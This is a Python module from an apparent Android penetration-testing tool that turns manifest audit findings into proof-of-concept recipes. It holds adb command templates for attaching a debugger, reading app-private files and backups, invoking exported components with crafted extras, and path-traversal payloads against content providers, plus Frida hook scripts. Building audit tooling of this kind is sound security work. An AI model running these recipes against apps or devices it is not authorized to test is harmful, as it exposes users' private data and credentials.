"""PoC generator — turn manifest_audit findings into runnable recipes.

Phase 3 / Unit 1. Operates on the AndroidAppMeta + AndroidAuditReport pair
already produced by Phase 2 (apk_decoder + manifest_audit). For each
finding with an actionable attack vector, emits one or more PoCArtifact
records: ADB shell snippets, Frida hook snippets, or informational notes.

Pure function — no APK probing, no device contact, no subprocess. The
recipes are textual templates the operator runs themselves on a controlled
test device. Placeholders in the form ``{...}`` are filled where the
manifest data permits; remaining placeholders are documented in each
artifact's ``notes``.

Coverage:
    MANIFEST-001  Debuggable       — jdwp + run-as (kind=adb)
    MANIFEST-002  Cleartext        — mitmproxy interception recipe (shell)
    MANIFEST-003  Allow Backup     — adb backup data extraction (adb)
    MANIFEST-004  Exported comp    — am start/startservice/broadcast per
                                     intent_action (adb) + a Frida hook
                                     observer on the entry method
                                     (onCreate / onStartCommand /
                                     onReceive) so the operator can pair
                                     invocation with payload capture
    MANIFEST-005  Exported provider— content query (adb; real authority
                                     when AndroidComponent.authorities
                                     is set)
    MANIFEST-006  grantUri        — path-traversal probes via content://
                                     (adb; authority resolved from
                                     manifest)

MANIFEST-007/008/009 are policy/posture findings without a direct PoC and
are intentionally skipped.
"""

from __future__ import annotations

from typing import Callable

from venomhook.models import (
    AndroidAppMeta,
    AndroidAuditReport,
    AndroidComponent,
    ManifestFinding,
    PoCArtifact,
)


__all__ = [
    "generate_pocs",
    "format_pocs_text",
    "PER_RULE_BUILDERS",
]


# ---------- helpers ----------


def _find_component(meta: AndroidAppMeta, fqn: str | None) -> AndroidComponent | None:
    if not fqn:
        return None
    for c in meta.components:
        if c.name == fqn:
            return c
    return None


def _launcher_activity(meta: AndroidAppMeta) -> AndroidComponent | None:
    """Best-effort launcher pick: an activity declaring the MAIN action."""
    for c in meta.components:
        if c.type != "activity":
            continue
        if "android.intent.action.MAIN" in c.intent_actions:
            return c
    activities = [c for c in meta.components if c.type == "activity"]
    return activities[0] if activities else None


# ---------- per-rule builders ----------


def _build_debuggable(meta: AndroidAppMeta, finding: ManifestFinding) -> list[PoCArtifact]:
    pkg = meta.package_name or "<package>"
    launcher = _launcher_activity(meta)
    launcher_name = launcher.name if launcher else f"{pkg}.MainActivity"
    launcher_note = (
        ""
        if launcher and "android.intent.action.MAIN" in launcher.intent_actions
        else "Launcher activity not detected from manifest; substitute the actual activity FQN."
    )
    return [
        PoCArtifact(
            rule_id=finding.rule_id,
            title="Attach jdb to debuggable process",
            severity=finding.severity,
            kind="adb",
            package_name=pkg,
            component=launcher_name,
            description=(
                "android:debuggable=true allows attaching jdb / Android Studio "
                "to the live process for breakpoint, variable inspection, and "
                "method invocation — bypassing any in-app anti-debug logic."
            ),
            commands=[
                f"adb shell am start -D -n {pkg}/{launcher_name}",
                f"PID=$(adb shell pidof {pkg})",
                "adb forward tcp:8700 jdwp:$PID",
                "jdb -attach localhost:8700 -sourcepath .",
            ],
            expected_evidence=(
                "jdb prints 'Initializing jdb ...' and a (jdb) prompt; "
                "'classes' lists application classes."
            ),
            notes=launcher_note,
            references=list(finding.references),
        ),
        PoCArtifact(
            rule_id=finding.rule_id,
            title="Read app-private files via run-as",
            severity=finding.severity,
            kind="adb",
            package_name=pkg,
            description=(
                "Debuggable apps allow `adb shell run-as <pkg>` from any "
                "non-root device, exposing /data/data/<pkg>/ contents "
                "(SharedPreferences, sqlite databases, encryption keys)."
            ),
            commands=[
                f"adb shell run-as {pkg} ls -la databases/ shared_prefs/ files/",
                f"adb shell run-as {pkg} cat shared_prefs/*.xml",
            ],
            expected_evidence=(
                "Directory listing of the app's private storage and contents "
                "of XML preferences — not normally readable without root."
            ),
            references=list(finding.references),
        ),
    ]


def _build_cleartext(meta: AndroidAppMeta, finding: ManifestFinding) -> list[PoCArtifact]:
    pkg = meta.package_name or "<package>"
    return [
        PoCArtifact(
            rule_id=finding.rule_id,
            title="Intercept HTTP traffic with mitmproxy",
            severity=finding.severity,
            kind="shell",
            package_name=pkg,
            description=(
                "Cleartext traffic permitted means HTTP requests/responses "
                "can be read and modified by an on-path attacker. A local "
                "mitmproxy can prove the channel is unencrypted; no app "
                "modification or root is required when the device routes "
                "through the proxy."
            ),
            commands=[
                "mitmproxy --listen-port 8080 --mode regular",
                "# On device: Settings > Wi-Fi > <network> > Proxy: manual host=<PC IP> port=8080",
                f"adb shell am start -n {pkg}/.MainActivity",
                "# Watch mitmproxy console for plaintext request/response pairs",
            ],
            expected_evidence=(
                "mitmproxy lists HTTP requests with full URLs, headers, and "
                "bodies in the clear (no TLS handshake)."
            ),
            notes=(
                "If a Network Security Config is present this rule may still "
                "fire because of an explicit cleartext-permitted domain — "
                "inspect res/xml/network_security_config.xml to find the "
                "specific host(s)."
            ),
            references=list(finding.references),
        ),
    ]


def _build_allow_backup(meta: AndroidAppMeta, finding: ManifestFinding) -> list[PoCArtifact]:
    pkg = meta.package_name or "<package>"
    return [
        PoCArtifact(
            rule_id=finding.rule_id,
            title="Extract app data via adb backup",
            severity=finding.severity,
            kind="adb",
            package_name=pkg,
            description=(
                "android:allowBackup=true (default <31) lets adb perform a "
                "full data backup — SharedPreferences, databases, files — "
                "with only USB debugging access. No root required."
            ),
            commands=[
                f"adb backup -f {pkg}.ab -apk -shared -all -system {pkg}",
                "# User must tap 'Back up my data' on the device prompt",
                f"dd if={pkg}.ab bs=24 skip=1 | openssl zlib -d > {pkg}.tar",
                f"tar -xvf {pkg}.tar",
            ],
            expected_evidence=(
                "Tar contains apps/<pkg>/{sp,db,f,r}/ trees with the app's "
                "private data files."
            ),
            notes=(
                "If backup yields a 0-byte file the app set fullBackupContent "
                "to exclude everything — partial protection, not a fix. "
                "Devices >= API 31 may require an --no-system override."
            ),
            references=list(finding.references),
        ),
    ]


def _am_command_for(component: AndroidComponent, pkg: str, action: str | None) -> str:
    """Compose an `adb shell am ...` line for a given component type."""
    target = f"-n {pkg}/{component.name}"
    action_part = f" -a {action}" if action else ""
    if component.type == "activity":
        return f"adb shell am start{action_part} {target}"
    if component.type == "service":
        return f"adb shell am startservice{action_part} {target}"
    if component.type == "receiver":
        return f"adb shell am broadcast{action_part} {target}"
    # Fallback (provider falls under MANIFEST-005, not this builder).
    return f"adb shell am start{action_part} {target}"


def _build_exported_no_permission(
    meta: AndroidAppMeta, finding: ManifestFinding
) -> list[PoCArtifact]:
    pkg = meta.package_name or "<package>"
    component = _find_component(meta, finding.component)
    if component is None:
        # Degraded mode — finding came from a meta we can't fully introspect.
        return [PoCArtifact(
            rule_id=finding.rule_id,
            title=f"Invoke exported component {finding.component or '<unknown>'}",
            severity=finding.severity,
            kind="adb",
            package_name=pkg,
            component=finding.component,
            description=(
                "Component is exported with no permission. Substitute the "
                "appropriate `am` subcommand based on its type."
            ),
            commands=[f"adb shell am start -n {pkg}/{finding.component or '<class>'}"],
            references=list(finding.references),
        )]

    actions = component.intent_actions or [None]
    artifacts: list[PoCArtifact] = []
    for action in actions:
        cmd = _am_command_for(component, pkg, action)
        artifacts.append(PoCArtifact(
            rule_id=finding.rule_id,
            title=f"Invoke exported {component.type} '{component.name}'"
            + (f" (action={action})" if action else ""),
            severity=finding.severity,
            kind="adb",
            package_name=pkg,
            component=component.name,
            description=(
                f"Exported {component.type} accepts external intents without "
                "permission. The recipe sends a direct intent; in real "
                "scenarios attackers also send extras crafted to reach "
                "trust-decision sites in onCreate/onReceive."
            ),
            commands=[
                cmd,
                "# Append crafted extras to probe parsing logic, e.g.:",
                f"#   {cmd} --es payload \"$(printf 'A%.0s' {{1..1024}})\"",
            ],
            expected_evidence=(
                "Component starts / receives the intent under the calling "
                "shell uid (2000) instead of the app uid; logcat shows "
                "onCreate/onStartCommand/onReceive entries."
            ),
            references=list(finding.references),
        ))
    artifacts.append(_frida_intent_observer(component, pkg, finding))
    return artifacts


def _frida_intent_observer(
    component: AndroidComponent, pkg: str, finding: ManifestFinding
) -> PoCArtifact:
    """Frida script that hooks the component's entry point and logs the
    incoming Intent + extras. Lets the operator confirm the ADB recipe
    actually reached the component and observe what payload arrived.
    """
    if component.type == "activity":
        body = _FRIDA_ACTIVITY_TEMPLATE.format(klass=component.name)
        entry = "onCreate"
    elif component.type == "service":
        body = _FRIDA_SERVICE_TEMPLATE.format(klass=component.name)
        entry = "onStartCommand"
    elif component.type == "receiver":
        body = _FRIDA_RECEIVER_TEMPLATE.format(klass=component.name)
        entry = "onReceive"
    else:  # pragma: no cover — providers go through MANIFEST-005
        body = f"// unsupported component type: {component.type}"
        entry = "?"
    return PoCArtifact(
        rule_id=finding.rule_id,
        title=f"Observe intents to '{component.name}' via Frida ({entry})",
        severity=finding.severity,
        kind="frida",
        package_name=pkg,
        component=component.name,
        description=(
            f"Hooks {component.type}.{entry} on '{component.name}' and "
            "prints the incoming Intent action + extras. Pair with the "
            "ADB recipe to confirm reachability and capture the payload "
            "the attacker would send."
        ),
        commands=body.splitlines(),
        expected_evidence=(
            f"frida console prints '[+] {component.name}.{entry} ...' on "
            "every external invocation; extras dump shows the parameters "
            "the calling shell supplied."
        ),
        notes=(
            f"Run with: frida -U -f {pkg} -l <this-file>.frida.js --no-pause"
        ),
        references=list(finding.references),
    )


_FRIDA_ACTIVITY_TEMPLATE = """\
Java.perform(() => {{
  const Klass = Java.use("{klass}");
  Klass.onCreate.overload('android.os.Bundle').implementation = function (b) {{
    console.log("[+] {klass}.onCreate called");
    const intent = this.getIntent();
    if (intent) {{
      console.log("[+]   action:", intent.getAction());
      const extras = intent.getExtras();
      if (extras) {{
        const keys = extras.keySet().toArray();
        for (let i = 0; i < keys.length; i++) {{
          const k = keys[i];
          console.log("[+]   extra[" + k + "] =", extras.get(k));
        }}
      }}
    }}
    return this.onCreate(b);
  }};
}});"""

_FRIDA_SERVICE_TEMPLATE = """\
Java.perform(() => {{
  const Klass = Java.use("{klass}");
  Klass.onStartCommand.implementation = function (intent, flags, startId) {{
    const action = intent ? intent.getAction() : null;
    console.log("[+] {klass}.onStartCommand action =", action);
    if (intent) {{
      const extras = intent.getExtras();
      if (extras) {{
        const keys = extras.keySet().toArray();
        for (let i = 0; i < keys.length; i++) {{
          const k = keys[i];
          console.log("[+]   extra[" + k + "] =", extras.get(k));
        }}
      }}
    }}
    return this.onStartCommand(intent, flags, startId);
  }};
}});"""

_FRIDA_RECEIVER_TEMPLATE = """\
Java.perform(() => {{
  const Klass = Java.use("{klass}");
  Klass.onReceive.implementation = function (ctx, intent) {{
    const action = intent ? intent.getAction() : null;
    console.log("[+] {klass}.onReceive action =", action);
    if (intent) {{
      const extras = intent.getExtras();
      if (extras) {{
        const keys = extras.keySet().toArray();
        for (let i = 0; i < keys.length; i++) {{
          const k = keys[i];
          console.log("[+]   extra[" + k + "] =", extras.get(k));
        }}
      }}
    }}
    return this.onReceive(ctx, intent);
  }};
}});"""


def _provider_authority(meta: AndroidAppMeta, finding: ManifestFinding) -> tuple[str, str]:
    """Return (authority, notes_suffix) for a provider finding.

    Looks up the AndroidComponent matching finding.component and uses its
    first declared authority. Falls back to '<AUTHORITY>' placeholder with
    a guidance note when the manifest declared no authority (e.g., older
    apktool output) or the component isn't present in meta.
    """
    component = _find_component(meta, finding.component)
    if component and component.authorities:
        primary = component.authorities[0]
        suffix = ""
        if len(component.authorities) > 1:
            extras = ", ".join(component.authorities[1:])
            suffix = f"Additional authorities declared: {extras}."
        return primary, suffix
    return (
        "<AUTHORITY>",
        "android:authorities was not present on this provider; substitute "
        "the actual authority from the decoded AndroidManifest.xml.",
    )


def _build_exported_provider(
    meta: AndroidAppMeta, finding: ManifestFinding
) -> list[PoCArtifact]:
    pkg = meta.package_name or "<package>"
    authority, notes_suffix = _provider_authority(meta, finding)
    return [
        PoCArtifact(
            rule_id=finding.rule_id,
            title=f"Query exported provider '{finding.component}'",
            severity=finding.severity,
            kind="adb",
            package_name=pkg,
            component=finding.component,
            description=(
                "Exported provider exposes content:// URIs to other apps. "
                "Without root or special permissions the operator can issue "
                "query/insert/update/delete via `adb shell content`."
            ),
            commands=[
                f"adb shell content query --uri content://{authority}/",
                f"adb shell content query --uri content://{authority}/<path>",
            ],
            expected_evidence=(
                "Returned rows from the provider, or 'No result found.' "
                "(an unauthorized denial would surface SecurityException)."
            ),
            notes=notes_suffix,
            references=list(finding.references),
        ),
    ]


def _build_grant_uri(meta: AndroidAppMeta, finding: ManifestFinding) -> list[PoCArtifact]:
    pkg = meta.package_name or "<package>"
    authority, notes_suffix = _provider_authority(meta, finding)
    notes = "Pair with MANIFEST-005 if the provider is also exported."
    if notes_suffix:
        notes = f"{notes} {notes_suffix}"
    return [
        PoCArtifact(
            rule_id=finding.rule_id,
            title=f"Path-traversal probes against '{finding.component}'",
            severity=finding.severity,
            kind="adb",
            package_name=pkg,
            component=finding.component,
            description=(
                "grantUriPermissions=true combined with weak path validation "
                "lets a caller read files outside the intended directory by "
                "injecting '..' segments into the URI path."
            ),
            commands=[
                "# Probe with a normal path first to confirm reachability:",
                f"adb shell content query --uri content://{authority}/files/test",
                "# Then probe traversal payloads:",
                f"adb shell content read --uri content://{authority}/files/../../../etc/hosts",
                f"adb shell content read --uri content://{authority}/files/..%2F..%2F..%2Fdata%2Fdata%2F"
                + pkg + "%2Fshared_prefs%2F",
            ],
            expected_evidence=(
                "File contents from outside the provider's intended root "
                "(e.g., /etc/hosts or app-private SharedPreferences) — "
                "indicates missing canonicalization."
            ),
            notes=notes,
            references=list(finding.references),
        ),
    ]


# ---------- registry & entry point ----------


PER_RULE_BUILDERS: dict[str, Callable[[AndroidAppMeta, ManifestFinding], list[PoCArtifact]]] = {
    "MANIFEST-001": _build_debuggable,
    "MANIFEST-002": _build_cleartext,
    "MANIFEST-003": _build_allow_backup,
    "MANIFEST-004": _build_exported_no_permission,
    "MANIFEST-005": _build_exported_provider,
    "MANIFEST-006": _build_grant_uri,
}


def generate_pocs(
    meta: AndroidAppMeta, report: AndroidAuditReport
) -> list[PoCArtifact]:
    """Build PoC artifacts for every finding with a registered builder.

    Findings whose rule_id has no builder (informational rules like
    MANIFEST-007..009) are skipped silently. Output order mirrors
    ``report.findings`` so the operator can read PoCs alongside the audit.
    """
    artifacts: list[PoCArtifact] = []
    for f in report.findings:
        builder = PER_RULE_BUILDERS.get(f.rule_id)
        if builder is None:
            continue
        artifacts.extend(builder(meta, f))
    return artifacts


def format_pocs_text(artifacts: list[PoCArtifact]) -> str:
    """Render artifacts as a terminal-friendly text bundle.

    One section per artifact, ordered as given. Commands are indented two
    spaces so the bundle can be grepped/sliced without breaking quoting.
    """
    if not artifacts:
        return "PoC bundle — (no actionable findings)"

    lines = [f"PoC bundle — {len(artifacts)} artifact{'s' if len(artifacts) != 1 else ''}", ""]
    for i, a in enumerate(artifacts, 1):
        comp = f" [{a.component}]" if a.component else ""
        lines.append(f"#{i} [{a.severity.upper()}] {a.rule_id} {a.title}{comp}")
        lines.append(f"   kind: {a.kind}    package: {a.package_name}")
        if a.description:
            lines.append(f"   {a.description}")
        if a.commands:
            lines.append("   commands:")
            for c in a.commands:
                lines.append(f"     {c}")
        if a.expected_evidence:
            lines.append(f"   expected: {a.expected_evidence}")
        if a.notes:
            lines.append(f"   notes:    {a.notes}")
        if a.references:
            lines.append(f"   refs:     {', '.join(a.references)}")
        lines.append("")
    return "\n".join(lines).rstrip() + "\n"
